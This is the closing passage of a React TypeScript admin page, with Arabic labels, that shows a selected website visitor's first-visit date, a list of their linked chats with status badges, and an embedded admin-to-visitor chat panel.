                        <div className="bg-muted/30 rounded-lg p-3 flex items-center gap-2.5">
                          <Clock className="w-4 h-4 text-primary shrink-0" />
                          <div><p className="text-[10px] text-muted-foreground">تاريخ الزيارة الأولى</p><p className="text-xs font-medium text-foreground">{formatDate(selectedVisitor.created_at)}</p></div>
                        </div>
                      </div>
                    </AccordionContent>
                  </AccordionItem>

                  {/* المحادثات */}
                  <AccordionItem value="chat" className="border border-border rounded-xl overflow-hidden">
                    <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                      <div className="flex items-center gap-2">
                        <MessageCircle className="w-4 h-4 text-primary" />المحادثات
                        {linkedChats.length > 0 && <span className="px-1.5 py-0.5 rounded-full bg-primary/10 text-primary text-[10px] font-bold">{linkedChats.length}</span>}
                      </div>
                    </AccordionTrigger>
                    <AccordionContent className="px-4 py-3">
                      {linkedChats.length === 0 ? (
                        <p className="text-xs text-muted-foreground text-center py-3">لا توجد محادثات</p>
                      ) : (
                        <div className="space-y-2">
                          {linkedChats.map(chat => (
                            <div key={chat.id} className="bg-muted/20 rounded-lg border border-border/50 p-3 flex items-center justify-between">
                              <div>
                                <p className="text-xs font-bold text-foreground">{chat.visitor_name || "محادثة"}</p>
                                <p className="text-[10px] text-muted-foreground">{formatDate(chat.created_at)}</p>
                              </div>
                              <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                                chat.status === "active" ? "bg-emerald-500/10 text-emerald-600" :
                                chat.status === "waiting" ? "bg-amber-500/10 text-amber-600" :
                                "bg-muted text-muted-foreground"
                              }`}>
                                {chat.status === "active" ? "نشطة" : chat.status === "waiting" ? "بانتظار رد" : chat.status === "bot" ? "بوت" : chat.status}
                              </span>
                            </div>
                          ))}
                        </div>
                      )}
                    </AccordionContent>
                  </AccordionItem>
                </Accordion>

                {/* Chat with visitor */}
                <div className="space-y-2 pt-2 border-t border-border">
                  <div className="flex items-center gap-2">
                    <MessageCircle className="w-4 h-4 text-primary" />
                    <h3 className="text-sm font-bold text-foreground">محادثة مع الزائر</h3>
                  </div>
                  <AdminVisitorChat visitorSessionId={selectedVisitor.session_id} visitorName={selectedVisitor.visitor_name} />
                </div>

              </div>
            )}
          </div>
        </div>
      </div>
    </>
  );
};

const InfoItem = forwardRef<HTMLDivElement, { label: string; value: string | null }>(({ label, value }, ref) => (
  <div ref={ref}>
    <p className="text-[10px] text-muted-foreground mb-0.5">{label}</p>
    <p className="text-xs font-semibold text-foreground">{value || "-"}</p>
  </div>
));
InfoItem.displayName = "InfoItem";

export default AdminVisitors;
